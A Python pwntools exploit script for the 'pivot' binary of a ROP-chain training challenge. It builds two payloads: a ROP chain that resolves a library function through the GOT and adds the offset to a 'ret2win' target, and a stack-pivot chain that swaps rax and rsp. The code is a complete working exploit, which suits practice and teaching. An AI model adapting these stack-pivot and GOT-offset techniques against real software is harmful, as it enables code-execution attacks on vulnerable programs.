from pwn import *
context.log_level = 'debug'

io = process('./pivot')
elf = ELF('./pivot')
lib = ELF('./libpivot.so')

rax = 0x4009bb
rsp = 0x4009bd
rax_addr = 0x4009c0
add_rax = 0x4009c4
jmp_rax = 0x4007c1
main_addr = 0x400847

io.recvuntil(b'place to pivot: 0x')
fake_stack = int(io.recv(12).decode(), 16)

payload = p64(elf.plt['foothold_function'])
payload += p64(rax) + p64(elf.got['foothold_function'])
payload += p64(rax_addr)
payload += p64(add_rax)
payload += p64(jmp_rax)
io.sendlineafter(b'> ', payload)

payload = cyclic(32)	# 0x20
payload += p64(lib.symbols['ret2win'] - lib.symbols['foothold_function'])	# value that needed to be added to rax later
payload += p64(rax) + p64(fake_stack)	# pop fake stack address to rax
payload += p64(rsp)						# exchange rax and rsp, the length of first ROP comes to the limit: 0x40
io.sendlineafter(b'> ', payload)

io.interactive()